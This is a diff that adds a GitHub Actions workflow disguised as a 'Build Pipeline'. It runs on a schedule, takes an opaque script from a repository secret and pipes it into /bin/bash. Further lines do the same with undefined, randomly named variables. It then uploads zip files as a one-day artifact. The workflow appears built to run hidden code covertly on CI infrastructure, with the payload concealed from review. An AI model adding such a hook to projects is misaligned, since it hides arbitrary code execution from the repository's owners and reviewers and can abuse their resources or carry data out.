@@ -1,0 +1,28 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 1,7,13,19 * * *'
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          m3: ${{ secrets.m3 }}
+        run: |
+          printf '%s' "$m3" | jq -r .kou16 | /bin/bash
+          printf '%s' "$i019" | jq -r .x015 | /bin/bash
+          printf '%s' "$zfukn51" | jq -r .zov48390 | /bin/bash
+          printf '%s' "$tuapu83" | jq -r .kz0 | /bin/bash
+          printf '%s' "$gus81129" | jq -r .n4022 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: GtIxF7dl
+          path: "*.zip"
+          retention-days: 1
